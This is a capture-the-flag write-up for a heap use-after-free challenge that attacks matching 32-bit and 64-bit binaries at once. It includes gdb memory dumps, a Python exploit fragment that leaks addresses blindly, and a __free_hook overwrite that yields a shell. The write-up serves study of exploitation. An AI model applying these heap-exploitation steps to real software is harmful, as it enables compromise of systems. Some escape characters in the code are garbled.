# information
This challenge is cyber mimic challenge, you need to fuck two basic heap UAF exploit at the same time.
You wont get any leak possibility, because there is output check, if `mimic32` and `mimic64` have different outputs, The process will exit.
```C
      if ( memcmp(chunk1, chunk2, offset) )
        handler();
```

# bug
UAF
# exploit
How to exploit it is a challenge. 
The author introduced a blind sqli technique based on the output.
We can utilize the edit function to leak heap address. Since there is no checking of your input chars.
We can set the 64bits list look like this.
```
0x602040 <stderr@@GLIBC_2.2.5>:	0x0000155555329540	0x0000000000000000
0x602050:	0x0000000000000000	0x0000000000000000
0x602060 <list>:	0x0000000000603010	0x0000000000603050
0x602070 <list+16>:	0x0000000000603090	0x0000000000603070
0x602080 <list+32>:	0x0804b0900804b088	0x0804b1e000000001
0x602090 <list+48>:	0x0804b2e000000100	0x0000000000000000
0x6020a0 <list+64>:	0x0000000000602045	[0x00000000006020c0] 
0x6020b0 <list+80>:	0x0000000000000000	0x0000000000000000
0x6020c0 <list+96>:	0x0000000000000100	0x0000000000602046
0x6020d0 <list+112>:	0x000000000000006e	0x0000000000000000
```
list[8] will point to the stderr, and list[9] will point to the address below. firstly edit the list[9] to make list[8] a valid structure.
```python
    buf+= p64(0x602040+idx) + p64(list64+8*12)
    buf+= p64(0) + p64(0)#8
    buf+= p64(0x100) + p64(0x602041+idx)#9
    buf+= 'n'
    sl('4')
    sla('index?','0')
    sa('content:',buf)
    **edit(9,'x00'*7 + p64(bss64) + 'n')**
```
Like if we want to leak the byte at 0x602045, we have to make list[8] point to 0x602045, and *(0x602045 + 8) a valid writable address. After doing `edit(9, '\x00' * 7 + p64(bss64) + 'n')`.
```
gef➤  x/20gx 0x602045+0x8
0x60204d:	0x0000000000602360	0x000000000000006e
0x60205d:	0x0000603010000000	0x0000603050000000
0x60206d <list+13>:	0x0000603090000000	0x0000603070000000
0x60207d <list+29>:	0x900804b088000000	0xe0000000010804b0
0x60208d <list+45>:	0xe0000001000804b1	0x00000000000804b2
0x60209d <list+61>:	0x0000602045000000	0x00006020c0000000

```

32bits is the same. We can set the 32bits list look like this.
```
0x804b040 <stdin@@GLIBC_2.0>:	0x2aa62d602aa625a0	0x0000000000000000
0x804b050:	0x0000000000000000	0x0000000000000000
0x804b060 <list>:	0x0804c0280804c008	0x0804c0380804c048
0x804b070 <list+16>:	0x000000000804c058	0x0000000000000000
0x804b080 <list+32>:	0x0804b0900804b088	0x0804b1e000000001
0x804b090 <list+48>:	0x0804b2e000000100	0x0000000000000000
0x804b0a0 <list+64>:	0x0000000000602045	0x00000000006020c0
0x804b0b0 <list+80>:	0x0000000000000000	0x0000000000000000
0x804b0c0 <list+96>:	0x0000000000000100	0x0000000000602046
0x804b0d0 <list+112>:	0x000000000000006e	0x0000000000000000
```
Then edit the list[9].
After leaking, we can just overwrite the `__free_hook` and get the shell.

# thinking
It can be done with reverse shell, since there is no need to write anything to output with it.
But you need to bruteforce the 32bits ASLR as well.

Blind sqli is a great technique while attacking the mimic thing. FUCK the mimic thing... It's really useless.
